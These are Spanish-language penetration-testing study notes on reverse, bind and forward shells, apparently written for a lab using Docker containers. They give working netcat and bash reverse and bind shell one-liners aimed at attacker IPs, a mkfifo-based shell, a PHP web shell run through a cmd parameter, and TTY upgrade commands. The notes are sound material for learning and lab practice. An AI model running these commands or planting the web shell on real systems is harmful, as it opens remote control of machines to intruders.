# Bind shells, Reverse shells y Forward shells

***

[**https://www.revshells.com/**](https://www.revshells.com/)

* **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
* **Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
* **Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

## ganar una revershell

Con netcat nos podemos poner en escucha por un puerto mediante el comando

```
nc -nlvp 443
```

-n: no aplica resolucion dns -l: listen -v: verbose -p: puerto

en el caso de una ==reverse shell:==

nos ponemos en escucha con netcat por el puerto 443 y con la máquina comprometida hacemos una conexion de netcat mediante el comando

```
ncat -e /bin/bash 172.17.0.1 443
```

-e: execute

siendo la ip, la ip de nuestra máquina atacante

es posible que con nc ( no es lo mismo que ncat) no funcione, con lo cual tendrás que jugar con otro comando que se ve en la url de pentest monkey proporcionada abajo

tambien se puede ganar una consola interactiva mediante el comando

```
bash -i >& /dev/tcp/<ip atacante>/puerto 0>$1
```

```
<?
	echo "<pre>" . shell_exec($_GET['cmd']"</pre>")";
?>
```

\*\*cheetsheat de todos las posibles formas de crear una consola interactiva

```
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

en el caso de una ==bind shel== ofrecemos una shell por la máquina comprometida mediante el comando

```
nc -lnvp 443 -e /bin/bash
```

y me conecto a ella por la máquina atacante por el puerto 443

```
nc 172.17.0.2 443
```

en el caso de ==forward shell==, se usan cuando hay ciertas reglas que no nos permiten entablar una conexión, mediante el uso de ==iptables==. primero debemos instalar iptables, en docker al instalarlo no nos va a dejar ejecutarlo porque hay que crear ciertas reglas

```
docker run -dit -p 80:80 --cap-add=NET_ADMIN <nombre>
```

instala posteriormente en el contendor iptables con apt install iptables

comprueba el funcionamiento con iptables --flush

para aceptar todas las conexiones por el puerto 80

```
iptables -A OUTPUT -p tcp -m tcp -o eth0 --sport 80 -j ACCEPT
```

-o: eth0 debe ser la interfaz de red en el contenedor

para bloquear todo lo demas por el puerto TCP

```
iptables -A OUTPUT -o eth0 -j DROP
```

Asi solo quedaran expuestas las peticiones por el puerto 80

en el caso de que en la maquina victima hayamos logrado subir un archivo en php

el script que nos permite ==controlar el comando que quiero ejecutar==:

las etiquetas preformateadas \<pre> nos permite que el comando se muestre correctamente y no como un oneliner

\==no nos interpretara el php== hasta que no cambiemos la configuración de ==php.ini==, buscamos la linea short\_open\_tag = off por on y reiniciemos apache

```
apache systemtcl restart
```

En la url del servicio apache para ejecutar comandos

```
http://localhost/cmd.php?cmd=whoami
```

para ganar una tty totalmente interactiva desde el servicio hhtp

```
https://github.com/s4vitar/ttyoverhttp
```

hay que cambiar la ruta y el nombre del archivo y también las direcciones ip correspondientes

en este proyecto de github se juega con archivos temporales para con mkfifo en la ruta /dev/shm crear un archivo de entrada y uno de salida y son temporales y cuando sales de la consola se borran para no dejar rastro

mediante el comando

```
mkfifo input; tail -f input | /bin/bash 2>&1 > output
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.0.2.15 443 >/tmp/f
```

de esta manera en el momento que metas un comando en el archivo input y hagas un cat del output saldrá el comando que has escrito en output puedes escribir dos comandos seguidos en input y el output te mostrará el resultado de ambos comandos combinados

\==tienes que adaptar el script en php y quitar las etiquetas preformateadas== porque no son contempladas en el proyecto de savitar

### Tratamiento de la terminal

pasos a seguir para hacer el tratamiento de la terminal:

una vez hemos ganado acceso a una consola en la víctima:

```bash
script /dev/null -c bash
control z
stty raw -echo; fg
reset xterm
stty rows <filas> columns <columnas>
export TERM=xterm
export SHELL=bash
```

con stty size podemos ver cuantas columnas tiene nuestra terminal

```
stty size
```

***

#### A continuación vamos a ver varios métodos para lanzarnos una TTY

```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Python TTY Shell.
python3 -c 'import pty;pty.spawn("/bin/bash")' # Python TTY Shell.
/bin/sh -i # Spawn Interactive sh shell.
perl -e 'exec "/bin/sh";' # **Spawn Perl TTY Shell.
ruby -e 'exec "/bin/sh"' # Spawn Ruby TTY Shell.
```
